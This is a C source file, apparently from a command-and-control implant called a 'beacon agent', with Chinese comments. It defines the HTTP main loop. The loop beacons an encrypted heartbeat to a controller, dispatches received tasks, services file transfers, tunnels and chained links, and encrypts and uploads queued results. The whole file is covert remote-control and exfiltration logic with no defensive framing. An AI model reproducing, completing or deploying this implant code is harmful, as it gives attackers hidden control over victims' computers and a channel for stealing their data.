#include "beacon_agent_internal.h"

#if !defined(BEACON_EXTERNAL_TCP_BUILD)

/* 加密并通过 HTTP external 发送所有出站数据包 */
static VOID FlushOutboxHttp(BeaconContext* ctx, const ByteBuf* heartbeat)
{
    OutboxNode* list = OutboxDrain(&ctx->outbox);
    OutboxNode* cur = list;

    while (cur) {
        ByteBuf encrypted;
        ByteBuf response;

        if (!CryptoEncryptResult(ctx->session_key, sizeof(ctx->session_key), &cur->packet, &encrypted)) {
            OutboxPushFrontList(&ctx->outbox, cur);
            return;
        }

        if (!TransportHttpExchange(&ctx->profile, heartbeat, &encrypted, &response)) {
            BbFree(&encrypted);
            OutboxPushFrontList(&ctx->outbox, cur);
            return;
        }

        BbFree(&encrypted);
        BbFree(&response);

        {
            OutboxNode* done = cur;
            cur = cur->next;
            OutboxFreeNode(done);
        }
    }
}

/* HTTP external 主循环：心跳、接收任务、处理、上传结果 */
INT AgentRunExternalHttp(Agent* agent)
{
    BeaconContext* ctx;

    if (!agent) return -1;
    ctx = &agent->ctx;

    while (ctx->active && InterlockedCompareExchange(&agent->stop, 0, 0) == 0) {
        ByteBuf plain;
        ByteBuf heartbeat;
        ByteBuf response;

        BeaconSleep(ctx);

        plain = AgentBuildHeartbeatPlain(ctx);
        if (!CryptoEncryptHeartbeat(ctx->profile.encrypt_key, &plain, &heartbeat)) {
            BbFree(&plain);
            continue;
        }
        BbFree(&plain);

        if (TransportHttpExchange(&ctx->profile, &heartbeat, NULL, &response)) {
            AgentDispatchTasks(ctx, &response);
            AgentFlushTransfers(ctx);
            AgentFlushTunnels(ctx);
            AgentFlushCascade(ctx);
            FlushOutboxHttp(ctx, &heartbeat);
            BbFree(&response);
        }

        BbFree(&heartbeat);
    }

    return 0;
}

#endif
